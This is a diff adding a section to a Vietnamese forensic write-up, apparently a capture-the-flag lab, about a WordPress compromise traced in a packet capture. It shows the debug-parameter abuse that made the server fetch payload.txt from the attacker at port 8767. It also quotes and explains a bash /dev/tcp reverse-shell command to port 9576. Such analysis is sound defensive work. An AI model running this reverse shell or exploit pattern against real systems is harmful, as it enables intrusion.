@@ -132,6 +132,26 @@ Khi server kiểm tra tham số `swp_debug` trên thanh url nếu nó được s
 
 <img width="866" height="799" alt="image" src="https://github.com/user-attachments/assets/33135283-4789-47a2-b90c-25104cfdb110" />
 
+Lúc này kẻ tấn công đã lợi dụng được lổ hỗng này của trang web và chạy một script độc khiến cho trang web bị `reverse shell` để hắn có thể tạo kết nối từ web server với máy của attacker để hắn không bị hệ thống `WAF` chặn. Vậy thì theo logic này chúng ta đã biết được là web server sẽ bị ép để thực hiện 1 request `GET` về một payload độc hại từ attacker, tìm port mà server đã tải payload đó về. 
+
+Tiếp theo là khi server đã bị thực hiện reverse_shell thì cổng mà server kết nối với attacker là gì ?
+
+Giờ mình sẽ giải quyết từng cái một, đầu tiên là cổng mà server đã thực hiện tải payload về: `ip.src == 192.168.1.102 && ip.dst == 192.168.1.104 && http`
+
+<img width="1909" height="709" alt="image" src="https://github.com/user-attachments/assets/7e11d881-541a-4aa1-aa25-5821dfc1ab30" />
+
+<img width="1915" height="345" alt="image" src="https://github.com/user-attachments/assets/dc218079-00ca-4705-8dc9-548a904c2830" />
+
+Đúng như vậy là attacker đã thực hiện khai thác lỗ hổng của chức năng debug và sửa cấu hình từ xa từ hai biến `swp_debug=load_options` và cho server tải về `payload.txt` từ `url=http://192.168.1.104:8767/payload.txt`. Cổng mà attacker thực hiện cho server tải payload xuống là cổng `8767`. Lúc này bên phía của máy attacker cũng thực hiện trả về `payload.txt` cho server từ lệnh reuqest GET của server. Và chúng ta thấy được là nó đã thành công ở thông báo `200 OK`.
+
+<img width="1280" height="583" alt="image" src="https://github.com/user-attachments/assets/5fc9ef2e-4d61-4ea5-818b-12b02c18eb81" />
+
+Attacker đã thực hiện chạy script độc: `system("bash -c \"bash -i >& /dev/tcp/192.168.1.104/9576 0>&1\"")`. Như trong report của các trang web thì lệnh tấn công được attacker để bên trong thẻ `<pre>  </pre>` Và thực hiện chạy ngay lập tức. Em sẽ giải thích 1 chút qua về script này:
+
+- Đầu tiên attacker thực hiện `bash -c` gọi chương trình bash shell và `-c` sẽ đọc chuỗi phía sau lệnh bash và thực thi nó.
+
+- Tiếp theo nó thực hiện kết nối tới địa chỉ ip `192.168.1.104` tại port `9576` để kết nối reverse shell, tham số `>&` tức là mọi output trên máy của server thay vì hiện trên màn hình nạn nhân, thì nó sẽ được truyền vào địa chỉ ip của attacker, kết hợp cùng với 2 tham số `0>&1`, cách hoạt động là: tất cả những gì attacker gõ trên bàn phím sẽ input vào trình bash shell, và attacker có thể nhìn thấy những gì mình nhập và output đó cũng được truyền về màn hình attacker.
 
 
+Vậy kết luận lại thì: Lúc này kẻ tấn công đã lợi dụng được lổ hổng của web WordPress và thực hiện tải về một payload và thực thi nó, payload này cho phép kẻ tấn công thực hiện `reverse shell` lên server. Cổng mà server tải về payload là `port:8767` còn cổng reverse shell máy nạn nhân là `port:9576`.
 
